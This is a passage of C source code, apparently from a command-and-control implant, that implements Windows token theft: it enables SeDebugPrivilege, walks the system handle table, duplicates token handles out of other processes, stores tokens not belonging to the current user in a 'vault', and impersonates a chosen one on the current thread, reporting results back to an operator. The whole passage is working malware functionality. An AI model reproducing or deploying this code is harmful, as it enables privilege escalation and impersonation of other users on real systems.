            TokenIntegrityInformation = Instance.Win32.LocalAlloc( LPTR, cbSize );

            if ( Instance.Win32.GetTokenInformation( hToken, TokenIntegrityLevel, TokenIntegrityInformation, cbSize, &cbSize ) )
            {
                *pIntegrity = *Instance.Win32.GetSidSubAuthority(TokenIntegrityInformation->Label.Sid, (DWORD)(UCHAR)(*Instance.Win32.GetSidSubAuthorityCount(TokenIntegrityInformation->Label.Sid) - 1));
                ReturnValue = TRUE;
            }
            else
            {
                PUTS( "GetTokenInformation failed" )
            }
        }
        else if (TokenStatisticsInformation->TokenType == TokenImpersonation)
        {
            // get the token impersonation level
            Instance.Win32.GetTokenInformation( hToken, TokenImpersonationLevel, NULL, 0, &returned_tokimp_length );
            TokenImpersonationInformation = Instance.Win32.LocalAlloc( LPTR, returned_tokimp_length );

            if ( Instance.Win32.GetTokenInformation( hToken, TokenImpersonationLevel, TokenImpersonationInformation, returned_tokimp_length, &returned_tokimp_length ) )
            {
                *pImpersonationLevel = * ( ( SECURITY_IMPERSONATION_LEVEL * ) TokenImpersonationInformation );
                ReturnValue = TRUE;
            }
            else
            {
                PUTS( "GetTokenInformation failed" )
            }
        }
    }
    else
    {
        PUTS( "GetTokenInformation failed" )
    }

Cleanup:
    DATA_FREE( TokenStatisticsInformation,returned_tokinfo_length );
    DATA_FREE( TokenIntegrityInformation,cbSize );
    DATA_FREE( TokenImpersonationInformation,returned_tokimp_length );
    if ( ! ReturnValue )
    {
        DATA_FREE( UserDomain->Buffer, UserDomain->Length );
    }

    return ReturnValue;
}

// check if a PID is included in the process list
BOOL ProcessIsIncluded( IN PPROCESS_LIST process_list, IN ULONG ProcessId )
{
    for (ULONG i = 0; i < process_list->Count; i++)
    {
        if (process_list->ProcessId[i] == ProcessId)
            return TRUE;
    }
    return FALSE;
}

// obtain a list of PIDs from a handle table
BOOL GetProcessesFromHandleTable( IN PSYSTEM_HANDLE_INFORMATION handleTableInformation, OUT PPROCESS_LIST* pprocess_list )
{
    BOOL ret_val = FALSE;
    PPROCESS_LIST process_list = NULL;

    process_list = Instance.Win32.LocalAlloc( LPTR, sizeof(PROCESS_LIST) );

    PSYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo;
    for (ULONG i = 0; i < handleTableInformation->NumberOfHandles; i++)
    {
        handleInfo = (PSYSTEM_HANDLE_TABLE_ENTRY_INFO)&handleTableInformation->Handles[i];

        if ( ! ProcessIsIncluded( process_list, handleInfo->UniqueProcessId ) )
        {
            if (process_list->Count + 1 > MAX_PROCESSES)
            {
                PUTS("Too many processes, please increase MAX_PROCESSES");
                goto cleanup;
            }
            process_list->ProcessId[process_list->Count++] = handleInfo->UniqueProcessId;
        }
    }

    *pprocess_list = process_list;
    ret_val = TRUE;

cleanup:
    if ( ! ret_val && process_list )
    {
        DATA_FREE(process_list, sizeof(PROCESS_LIST));
    }

    return ret_val;
}

// get all handles in the system
BOOL GetAllHandles( OUT PSYSTEM_HANDLE_INFORMATION* phandle_table, OUT PULONG phandle_table_size )
{
    BOOL ret_val = FALSE;
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    ULONG buffer_size = sizeof(SYSTEM_HANDLE_INFORMATION);
    ULONG prev_buffer_size = buffer_size;
    PVOID handleTableInformation = NULL;

    handleTableInformation = Instance.Win32.LocalAlloc( LPTR, buffer_size );

    while (TRUE)
    {
        //get information of all the existing handles
        status = SysNtQuerySystemInformation(
            SystemHandleInformation,
            handleTableInformation,
            buffer_size,
            &buffer_size);
        if ( status == STATUS_INFO_LENGTH_MISMATCH )
        {
            // the buffer was too small, buffer_size now has the new length
            DATA_FREE( handleTableInformation, prev_buffer_size );
            prev_buffer_size = buffer_size;
            handleTableInformation = Instance.Win32.LocalAlloc( LPTR, buffer_size );
            continue;
        }
        if ( ! NT_SUCCESS( status ) )
            goto cleanup;

        break;
    }

    *phandle_table = (PSYSTEM_HANDLE_INFORMATION)handleTableInformation;
    *phandle_table_size = buffer_size;
    ret_val = TRUE;

cleanup:
    if ( ! ret_val && handleTableInformation )
    {
        DATA_FREE( handleTableInformation, buffer_size );
    }

    return ret_val;
}

/* When finding tokens, we are ignoring tokens from the current user as they don't matter much */
BOOL IsNotCurrentUser( BOOL DoCheck, PBUFFER UserA, PBUFFER UserB )
{
    if ( DoCheck && ! StringCompareW( UserA->Buffer, UserB->Buffer ) )
        return FALSE;

    return TRUE;
}

BOOL ListTokens( PUSER_TOKEN_DATA* pTokens, PDWORD pNumTokens )
{
    BOOL                            ReturnValue                = FALSE;
    NTSTATUS                        NtStatus                   = STATUS_UNSUCCESSFUL;
    HANDLE                          hProcess                   = NULL;
    HANDLE                          hToken                     = NULL;
    CLIENT_ID                       ProcID                     = { 0 };
    OBJECT_ATTRIBUTES               ObjAttr                    = { sizeof( ObjAttr ) };
    PUSER_TOKEN_DATA                Tokens                     = NULL;
    DWORD                           NumTokens                  = 0;
    ULONG                           TokenTypeIndex             = 0;
    PSYSTEM_HANDLE_INFORMATION      handleTableInformation     = NULL;
    ULONG                           handleTableInformationSize = 0;
    PPROCESS_LIST                   ProcessList                = NULL;
    ULONG                           ProcessId                  = 0;
    BUFFER                          CurrentUser                = { 0 };
    HANDLE                          hOwnToken                  = NULL;
    BOOL                            CheckUsername              = FALSE;
    PSYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo                 = NULL;

    // try to get our own username, so we can avoid our own tokens
    if ( ( hOwnToken = TokenCurrentHandle() ) )
    {
        if ( TokenQueryOwner( hOwnToken, &CurrentUser, TOKEN_OWNER_FLAG_DEFAULT ) )
        {
            CheckUsername = TRUE;
        }
        SysNtClose( hOwnToken ); hOwnToken = NULL;
    }

    TokenSetSeDebugPriv( TRUE );

    // get the index of the object type 'Token'
    if ( ! GetTypeIndexToken( &TokenTypeIndex ) )
        goto Cleanup;

    // get the entire handle table
    if ( ! GetAllHandles( &handleTableInformation, &handleTableInformationSize ) )
        goto Cleanup;

    // obtain all PIDs from the handle table
    if ( ! GetProcessesFromHandleTable( handleTableInformation, &ProcessList ) )
        goto Cleanup;

    // allocate the USER_TOKEN_DATA table
    Tokens = Instance.Win32.LocalAlloc( LPTR, BUF_SIZE * sizeof( USER_TOKEN_DATA ) );
    if ( ! Tokens )
        goto Cleanup;

    // loop over each ProcessId
    for ( ULONG i = 0; i < ProcessList->Count; i++ )
    {
        ProcessId = ProcessList->ProcessId[i];

        if ( ProcessId == Instance.Session.PID )
            continue;
        if ( ProcessId == 0 )
            continue;
        if ( ProcessId == 4 )
            continue;

        // open a handle to the process
        hProcess = ProcessOpen( ProcessId, PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE );
        if ( ! hProcess )
            continue;

        // loop over each handle from this process
        for ( ULONG j = 0; j < handleTableInformation->NumberOfHandles; j++ )
        {
            handleInfo = (PSYSTEM_HANDLE_TABLE_ENTRY_INFO)&handleTableInformation->Handles[j];

            // make sure this handle is from the current ProcessId
            if ( handleInfo->UniqueProcessId != ProcessId )
                continue;

            // make sure the handle is of type 'Token'
            if ( handleInfo->ObjectTypeIndex != TokenTypeIndex )
                continue;

            // duplicate the token
            hToken = NULL;
            NtStatus = SysNtDuplicateObject(
                hProcess,
                (HANDLE)(DWORD_PTR)handleInfo->HandleValue,
                NtCurrentProcess(),
                &hToken,
                0,
                0,
                DUPLICATE_SAME_ACCESS);
            if ( NT_SUCCESS( NtStatus ) )
            {
                ProcessUserToken( hToken, ProcessId, (HANDLE)(DWORD_PTR)handleInfo->HandleValue, CheckUsername, &CurrentUser, Tokens, &NumTokens );

                SysNtClose( hToken ); hToken = NULL;
            }
        }

        // Also process primary tokens
        NtStatus = SysNtOpenProcessToken( hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken );
        if ( NT_SUCCESS( NtStatus ) )
        {
            ProcessUserToken( hToken, ProcessId, NULL, CheckUsername, &CurrentUser, Tokens, &NumTokens );

            SysNtClose( hToken ); hToken = NULL;
        }

        SysNtClose( hProcess ); hProcess = NULL;
    }

    *pTokens = Tokens;
    *pNumTokens = NumTokens;
    ReturnValue = TRUE;

Cleanup:
    if ( ! ReturnValue && Tokens ) {
        DATA_FREE( Tokens, NumTokens * sizeof( USER_TOKEN_DATA ) );
    }

    DATA_FREE( handleTableInformation, handleTableInformationSize );

    DATA_FREE( ProcessList, sizeof( PROCESS_LIST ) )

    DATA_FREE( CurrentUser.Buffer, CurrentUser.Length );

    return ReturnValue;
}

BOOL ImpersonateTokenFromVault(
    IN DWORD TokenID
) {
    PTOKEN_LIST_DATA TokenData = NULL;
    BOOL             Success   = FALSE;

    TokenData = TokenGet( TokenID );

    if ( ! TokenData ) {
        PUTS( "Token not found in vault." )
        PackageTransmitError( CALLBACK_ERROR_TOKEN, 0x1 );
        goto Cleanup;
    }

    if ( ! ImpersonateTokenInStore( TokenData ) )
        goto Cleanup;

    Success = TRUE;

Cleanup:
    return Success;
}

// https://doxygen.reactos.org/d1/d72/dll_2win32_2advapi32_2sec_2misc_8c_source.html#l00152
BOOL SysImpersonateLoggedOnUser( HANDLE hToken )
{
    SECURITY_QUALITY_OF_SERVICE Qos              = { 0 };
    OBJECT_ATTRIBUTES           ObjectAttributes = { 0 };
    HANDLE                      NewToken         = NULL;
    TOKEN_TYPE                  Type             = 0;
    ULONG                       ReturnLength     = 0;
    BOOL                        Duplicated       = FALSE;
    NTSTATUS                    Status           = STATUS_UNSUCCESSFUL;

    /* Get the token type */
    Status = SysNtQueryInformationToken(
        hToken,
        TokenType,
        &Type,
        sizeof(TOKEN_TYPE),
        &ReturnLength);
    if ( ! NT_SUCCESS( Status ) )
    {
        PRINTF( "NtQueryInformationToken: Failed:[%08x : %ld]\n", Status, Instance.Win32.RtlNtStatusToDosError( Status ) );
        return FALSE;
    }

    if (Type == TokenPrimary)
    {
        /* Create a duplicate impersonation token */
        Qos.Length = sizeof(SECURITY_QUALITY_OF_SERVICE);
        Qos.ImpersonationLevel = SecurityImpersonation;
        Qos.ContextTrackingMode = SECURITY_DYNAMIC_TRACKING;
        Qos.EffectiveOnly = FALSE;

        ObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
        ObjectAttributes.RootDirectory = NULL;
        ObjectAttributes.ObjectName = NULL;
        ObjectAttributes.Attributes = 0;
        ObjectAttributes.SecurityDescriptor = NULL;
        ObjectAttributes.SecurityQualityOfService = &Qos;

        Status = SysNtDuplicateToken(
            hToken,
            TOKEN_IMPERSONATE | TOKEN_QUERY,
            &ObjectAttributes,
            FALSE,
            TokenImpersonation,
            &NewToken);
        if ( ! NT_SUCCESS( Status ) )
        {
            return FALSE;
        }

        Duplicated = TRUE;
    }
    else
    {
        /* User the original impersonation token */
        NewToken = hToken;
        Duplicated = FALSE;
    }

    /* Impersonate the the current thread */
    Status = SysNtSetInformationThread(
        NtCurrentThread(),
        ThreadImpersonationToken,
        &NewToken,
        sizeof(HANDLE));

    if (Duplicated != FALSE)
    {
        SysNtClose(NewToken);
    }

    if ( ! NT_SUCCESS( Status ) )
    {
        PRINTF( "NtSetInformationThread: Failed:[%08x : %ld]\n", Status, Instance.Win32.RtlNtStatusToDosError( Status ) );
        return FALSE;
    }

    return TRUE;
}

BOOL ImpersonateTokenInStore(
    IN PTOKEN_LIST_DATA TokenData
) {
    BOOL     Success  = FALSE;
    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;

    if ( ! TokenData ) {
        goto Cleanup;
    }

    /* if we are already impersonating the selected token, do nothing */
    if ( Instance.Tokens.Impersonate && TokenData->Handle == Instance.Tokens.Token->Handle ) {
        return TRUE;
    }

    if ( ! TokenSetSeDebugPriv( TRUE ) ) {
        PUTS( "Could not enable SE_DEBUG_NAME privilege." )
        goto Cleanup;
    }

    if ( ! TokenRevSelf() ) {
        PACKAGE_ERROR_WIN32
        goto Cleanup;
    }

    if ( SysImpersonateLoggedOnUser( TokenData->Handle ) ) {
        Instance.Tokens.Impersonate = TRUE;
        Instance.Tokens.Token       = TokenData;

        PRINTF( "[+] Successfully impersonated: %ls\n", TokenData->DomainUser );
    } else {
        Instance.Tokens.Impersonate = FALSE;
        Instance.Tokens.Token       = NULL;

        PRINTF( "[!] Failed to impersonate token user: %ls\n", TokenData->DomainUser );

        PACKAGE_ERROR_WIN32

        if ( ! TokenRevSelf() ) {
            PACKAGE_ERROR_WIN32
        }

        goto Cleanup;
    }

    Success = TRUE;

Cleanup:
    return Success;
}
